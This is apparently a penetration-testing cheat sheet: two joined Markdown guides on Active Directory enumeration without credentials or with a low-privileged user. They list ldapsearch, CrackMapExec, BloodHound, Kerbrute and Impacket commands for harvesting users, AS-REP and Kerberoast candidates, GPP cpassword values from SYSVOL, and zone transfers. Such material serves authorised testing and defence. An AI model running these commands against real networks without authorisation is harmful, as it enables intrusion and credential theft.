# **Active Directory Pentesting: Enumeration (No Credentials / Low-Privileged User)**

## **Scenario:**
This document outlines **enumeration techniques for Active Directory (AD) penetration testing** when operating with **no credentials or a low-privileged user**. The goal is to **gather user lists, groups, shares, and domain structure** before proceeding to exploitation.

### **References for Further Study:**
- **MITRE ATT&CK – Credential Access & Discovery Techniques (T1087, T1069, T1207, T1552)**
- **BloodHound Red Teaming Guide**
- **Active Directory Enumeration Tools (LDAP, Kerberos, SMB, GPO Analysis)**
- **PowerView & CrackMapExec for AD Discovery**

---

# **🛠 Step 2: AD Enumeration (No Credentials / Low-Privileged User)**
**Objective:** Gather **user lists, groups, shares, and domain structure**.

## **2.1 User & Group Enumeration**

### **Enumerate Users via LDAP Queries (Anonymous Binds, ldapsearch, BloodHound)**
- **Why?** Many AD environments allow **anonymous or low-privileged LDAP queries**.
- **Techniques:**
  - **Enumerate users via anonymous LDAP binds:**
    - `ldapsearch -x -H ldap://<DC_IP> -s sub -b "DC=company,DC=com"`  
  - **Extract usernames from AD using ldapdomaindump:**
    - `ldapdomaindump -u '' -p '' <DC_IP>`
  - **Run BloodHound to visualize AD relationships:**
    - `bloodhound-python -d <domain> -u <user> -p <pass> -gc <DC_IP> -c All`
- **Alternative Methods:**
  - **Using Windows `dsquery` for user enumeration:**
    - `dsquery user -limit 0`
  - **PowerView enumeration:**
    - `Get-DomainUser -Domain company.com`
  - **Enumerate via CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --users`

### **Extract Users via Kerberos Pre-Auth Disabled (AS-REP Roasting)**
- **Why?** Users with **Kerberos pre-authentication disabled** allow retrieval of their encrypted hashes.
- **Techniques:**
  - **Use Kerbrute to identify AS-REP Roastable accounts:**
    - `kerbrute userenum -d <domain> --dc <DC_IP> usernames.txt`
  - **Request Kerberos tickets for vulnerable accounts:**
    - `GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat`
- **Alternative Methods:**
  - **Check for accounts with `Do not require Kerberos pre-authentication` flag using BloodHound.**
  - **Enumerate vulnerable users with CrackMapExec:**
    - `cme kerberos <DC_IP> -u users.txt -p '' --asreproast`

### **Enumerate Groups and Group Memberships (net group /domain, gpresult)**
- **Why?** Identifying **user groups** helps in **targeting privileged accounts**.
- **Techniques:**
  - **Enumerate domain groups via net commands:**
    - `net group /domain`
  - **Extract group memberships via LDAP:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(objectClass=group)"`
  - **Use PowerView to retrieve group details:**
    - `Get-NetGroup -Domain company.com`
- **Alternative Methods:**
  - **Use BloodHound’s `Group Membership` queries to analyze privilege escalation paths.**
  - **Enumerate groups using CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --groups`

### **Identify High-Privilege Accounts (DA, Server Admins, SQL Admins)**
- **Why?** Identifying **high-privileged users** helps in targeting **lateral movement**.
- **Techniques:**
  - **Identify domain admins via LDAP:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(memberOf=CN=Domain Admins, CN=Users,DC=company,DC=com)"`
  - **Find SQL Admins via PowerView:**
    - `Get-NetGroupMember -GroupName "SQL Admins"`
- **Alternative Methods:**
  - **BloodHound query:** `MATCH (u:User)-[:MemberOf]->(g:Group) WHERE g.name CONTAINS "Admin" RETURN u`
  - **Enumerate privileged accounts via CrackMapExec:**
    - `cme ldap <DC_IP> -u '' -p '' --groups | grep 'Admin'`

---

## **2.2 SMB & File Share Enumeration**

### **List Available SMB Shares (smbclient, enum4linux, CrackMapExec)**
- **Why?** SMB shares often contain **password files, scripts, and sensitive data**.
- **Techniques:**
  - **List shares via SMB client:**
    - `smbclient -L //<DC_IP> -N`
  - **Automated enumeration via enum4linux:**
    - `enum4linux -a <DC_IP>`
  - **Use CrackMapExec to find readable shares:**
    - `cme smb <DC_IP> -u '' -p '' --shares`

### **Access SYSVOL & NETLOGON for Credentials & Scripts**
- **Why?** SYSVOL often contains **plaintext credentials in GPO files**.
- **Techniques:**
  - **Manually browse SYSVOL via SMB:**
    - `smbclient //DC_IP/SYSVOL -U "guest"`
  - **Extract `Groups.xml` files for cpassword hashes:**
    - `findstr /S cpassword \SYSVOL\*.xml`

---

## **2.3 Kerberos Enumeration**

### **SPN Discovery (Kerberoasting Candidates) (GetUserSPNs, BloodHound)**
- **Why?** Service Principal Names (SPNs) are linked to **service accounts with Kerberos authentication**.
- **Techniques:**
  - **Find SPNs for Kerberoasting:**
    - `GetUserSPNs.py <domain>/ -usersfile users.txt`
  - **Use BloodHound for SPN discovery:**
    - `bloodhound-python -c All -d <domain>`

### **Identify Users with Unconstrained Delegation Enabled**
- **Why?** These users can **impersonate other users**, leading to privilege escalation.
- **Techniques:**
  - **Check for Unconstrained Delegation via PowerView:**
    - `Get-DomainComputer -Unconstrained`
  - **Use LDAP Queries to extract delegation accounts:**
    - `ldapsearch -x -h <DC_IP> -b "CN=Users,DC=company,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"`

---

## **2.4 Privilege Discovery via GPOs**

### **Extract Group Policy Preferences (GPP) Passwords**
- **Why?** GPP stores **plaintext passwords** in SYSVOL.
- **Techniques:**
  - **Manually browse SYSVOL:**
    - `smbclient //DC_IP/SYSVOL -U "guest"`
  - **Search for GPP password fields:**
    - `findstr /S cpassword \SYSVOL\*.xml`

### **Identify Mapped Drives & Startup Scripts with Potential Credentials**
- **Why?** Mapped drives & startup scripts may contain **passwords or useful network paths**.
- **Techniques:**
  - `Get-NetGPOGroup` (Enumerate GPO groups)
  - `gpresult /Scope Computer /v` (Extract applied GPO settings)
 

---

Domain enum:

# **Active Directory Domain Enumeration from a Domain Controller (DC) IP**

## **Scenario:**
This document outlines **techniques for extracting domain information when only given the IP address of a Domain Controller (DC)**. These methods leverage **DNS, NetBIOS, SMB, LDAP, Kerberos, and other AD-related services** to determine the **domain name, structure, and key assets**.

### **References for Further Study:**
- **MITRE ATT&CK – Discovery Techniques (T1018, T1087, T1482, T1590)**
- **Active Directory Enumeration Techniques (BloodHound, CrackMapExec, Impacket)**
- **Windows Internals for Active Directory Reconnaissance**

---

# **🛠 Methods to Enumerate the Domain from a DC IP**

## **1. Reverse Lookup the IP for the Domain Name**
- **Why?** The DC's hostname typically contains the domain name.
- **Techniques:**
  - **Windows:**  
    ```powershell
    nslookup <DC_IP>
    ```
  - **Linux/macOS:**  
    ```bash
    dig -x <DC_IP>
    ```
  - **Alternative Methods:**
    - `host <DC_IP>` (Linux/macOS)
    - `nmblookup -A <DC_IP>` (NetBIOS lookup)

---

## **2. Enumerate NetBIOS Name Information**
- **Why?** Many AD environments expose domain details via NetBIOS.
- **Techniques:**
  - **NetBIOS Name Query:**  
    ```bash
    nmblookup -A <DC_IP>
    ```
  - **Extract NetBIOS info using nbtscan:**  
    ```bash
    nbtscan -r <DC_IP>/24
    ```
  - **List NetBIOS details with smbclient:**  
    ```bash
    smbclient -L //<DC_IP> -N
    ```
  - **Use CrackMapExec for NetBIOS and SMB discovery:**  
    ```bash
    cme smb <DC_IP> --shares
    ```

---

## **3. Discover the Domain Name via LDAP**
- **Why?** The domain controller typically allows **anonymous LDAP queries**.
- **Techniques:**
  - **Query LDAP BaseDN for domain details:**
    ```bash
    ldapsearch -x -H ldap://<DC_IP> -s base namingContexts
    ```
  - **Check for available LDAP objects:**  
    ```bash
    ldapsearch -x -H ldap://<DC_IP> -b "DC=company,DC=com"
    ```
  - **Use CrackMapExec to enumerate LDAP:**  
    ```bash
    cme ldap <DC_IP> -u '' -p '' --users
    ```

---

## **4. Enumerate Active Directory via SMB**
- **Why?** If SMB is open, it may reveal the domain name and other assets.
- **Techniques:**
  - **Check for available SMB shares:**  
    ```bash
    smbclient -L //<DC_IP> -N
    ```
  - **Use rpcclient to list domain details:**  
    ```bash
    rpcclient -U "" <DC_IP>
    > enumdomains
    > querydominfo
    ```
  - **Alternative Methods:**
    - `crackmapexec smb <DC_IP> -u '' -p '' --shares`
    - `smbmap -H <DC_IP> -u '' -p ''`

---

## **5. Identify the Kerberos Realm (If Available)**
- **Why?** Kerberos authentication can reveal the AD domain name.
- **Techniques:**
  - **Check if Kerberos is running:**  
    ```bash
    nmap -p 88 --script=krb5-enum-users <DC_IP>
    ```
  - **Try Kerberos authentication against the DC:**  
    ```bash
    kinit -V anonymous@<domain>
    ```
  - **Extract domain name using Impacket:**  
    ```bash
    GetUserSPNs.py -dc-ip <DC_IP> anonymous
    ```

---

## **6. Extract DNS Information**
- **Why?** AD often runs DNS services that expose domain details.
- **Techniques:**
  - **Check for DNS records:**  
    ```bash
    nslookup -query=SOA <DC_IP>
    ```
  - **Perform a zone transfer (if misconfigured):**  
    ```bash
    dig axfr @<DC_IP> <domain>
    ```

---

## **7. Check for Windows-Specific Information**
- **Why?** Windows environments may expose domain details in system banners.
- **Techniques:**
  - **Check system details using SMB:**  
    ```bash
    nmap --script smb-os-discovery -p445 <DC_IP>
    ```
  - **Extract NetBIOS and domain details via WMI:**  
    ```powershell
    wmic /node:<DC_IP> computersystem get domain
    ```

---

# **📌 Summary of Methods**

| **Method**                  | **Tool/Command**                               | **Purpose** |
|-----------------------------|-----------------------------------------------|-------------|
| **Reverse Lookup**          | `nslookup <DC_IP>` / `dig -x <DC_IP>`         | Get domain name from DNS |
| **NetBIOS Enumeration**     | `nmblookup -A <DC_IP>` / `nbtscan`            | Find domain via NetBIOS |
| **LDAP Queries**            | `ldapsearch -x -H ldap://<DC_IP>`             | Extract domain name from LDAP |
| **SMB Enumeration**         | `smbclient -L //<DC_IP> -N`                   | Identify domain via SMB |
| **Kerberos Discovery**      | `nmap -p 88 --script=krb5-enum-users <DC_IP>` | Identify AD realm |
| **DNS Query**               | `dig axfr @<DC_IP> <domain>`                  | Extract AD DNS records |
| **Windows System Query**    | `wmic /node:<DC_IP> computersystem get domain` | Extract domain name from Windows |

---

### **Final Thought:**
> **“Enumeration is the foundation of a successful Active Directory compromise.”**

This document provides a **structured methodology for domain enumeration** from a **Domain Controller IP**, ensuring comprehensive reconnaissance before exploitation. 🚀



